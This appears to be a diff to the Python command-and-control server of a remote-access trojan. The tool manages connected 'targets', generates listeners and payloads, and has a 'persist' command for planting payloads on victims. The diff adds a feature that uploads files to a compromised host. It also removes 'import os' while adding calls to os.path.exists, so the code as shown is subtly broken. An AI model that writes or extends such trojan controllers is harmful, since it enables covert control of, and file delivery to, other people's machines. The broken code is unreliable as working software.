@@ -1,7 +1,6 @@
 #!/usr/bin/python3 
 
 import base64
-import os
 import random
 import shutil
 import socket
@@ -10,37 +9,10 @@ import subprocess
 import threading
 import time
 from datetime import datetime
-from colorama import *
 from prettytable import PrettyTable
-from Config import design
-from Config import colours
+from Config.design import *
 from Config.colours import *
-
-
-def banner():
-    design.banner()
-
-
-def help():
-    design.help()
-
-
-class Colours:
-
-    def success(function):
-        colours.success(function)
-
-    def error(function):
-        colours.error(function)
-
-    def info(function):
-        colours.info(function)
-
-    def quit(function):
-        colours.quit(function)
-
-    def process(function):
-        colours.process(function)
+from Config.commands import *
 
 
 def comm_in(targ_id):
@@ -116,6 +88,16 @@ def target_comm(targ_id, targets, num):
             # Commands
             if message == 'background' or message == 'bg':
                 break
+
+            if message == 'upload' or message == 'up':
+                file_name = input(Fore.BLUE + "[i] Enter File Name: " + Style.RESET_ALL)
+                file = open(file_name, 'rb')
+                file_data = file.read(1024)
+                while file_data:
+                    targ_id.send(file_data)
+                    file_data = file.read(1024)
+                file.close()
+                success("File Uploaded Successfully")
 
             if message == 'persist' or message == 'pt':
                 payload_name = input(Fore.BLUE + "[i] Enter Payload Name to Persist: " + Style.RESET_ALL)
@@ -432,6 +414,9 @@ if __name__ == "__main__":
             if command == 'help' or command == 'h':
                 help()
 
+            if command == 'clear' or command == 'cls':
+                clear()
+
             # Generate Listener Command
             if command == 'listeners -g' or command == 'listeners --generate':
                 host_ip = input(Fore.BLUE + "[i] Enter Listener IP: " + Style.RESET_ALL)
@@ -535,7 +520,8 @@ if __name__ == "__main__":
                 if quit_message == 'y' or quit_message == 'yes':
                     # Delete Payloads
                     process("Deleting Payloads")
-                    shutil.rmtree('Generated Payloads')
+                    if os.path.exists('Generated Payloads'):
+                        shutil.rmtree('Generated Payloads')
                     tar_length = len(targets)
                     for target in targets:
                         if target[7] == 'Dead':
@@ -555,7 +541,8 @@ if __name__ == "__main__":
                 tar_length = len(targets)
                 # Delete Payloads
                 process("Deleting Payloads")
-                shutil.rmtree('Generated Payloads')
+                if os.path.exists('Generated Payloads'):
+                    shutil.rmtree('Generated Payloads')
                 for target in targets:
                     if target[7] == 'Dead':
                         pass
@@ -568,3 +555,6 @@ if __name__ == "__main__":
                 break
             else:
                 continue
+
+        except ConnectionAbortedError:
+            break
